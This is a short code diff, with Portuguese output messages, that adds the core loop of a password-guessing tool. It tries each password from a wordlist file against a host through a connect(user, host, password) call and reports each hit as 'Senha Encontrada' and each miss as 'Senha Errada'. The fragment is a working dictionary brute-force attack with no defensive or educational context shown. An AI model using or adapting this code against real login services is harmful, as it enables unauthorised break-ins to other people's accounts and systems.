@@ -26,4 +26,9 @@ def main():
   for password in arquivo.readlines():
     password = password.strip('\n');
     print(password);
+    try:
+      child = connect(user,host,password);
+      print('[+] Senha Encontrada:' + password);
+    except:
+        print('[-] Senha Errada:' + password);
 main();
